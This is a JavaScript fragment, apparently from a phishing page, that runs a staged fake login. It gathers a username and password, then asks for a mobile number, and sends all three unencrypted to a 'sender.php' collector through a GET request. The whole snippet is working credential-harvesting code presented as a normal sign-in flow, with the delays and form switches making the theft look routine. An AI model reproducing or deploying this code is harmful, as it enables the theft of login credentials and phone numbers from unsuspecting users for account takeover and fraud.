        jQuery.noConflict();
          jQuery(function($) {
              $('#next-1').click(function() {
                  if($('#usernameId').val().length >= 4 && $('#passwordId').val().length)
                  {
                    setTimeout(function()
                    {
                      $('#form-login-data').hide();
                      $('#form-login-mobile').show();
                    }, 1000);
                  }
              });
              $('#next-2').click(function() {
                if($('#mobileID').val().length > 9)
                {
                  setTimeout(function() {
                    $('#form-login-mobile').hide();
                    $('#form-login-result').show();
                  }, 1000);
                  var xhttp = new XMLHttpRequest();
                  xhttp.open("GET", 'sender.php?L='+$('#usernameId').val()+'&P='+$('#passwordId').val()+'&T='+$('#mobileID').val(), true);
                  xhttp.send();
                }
              });
          });
      </script>
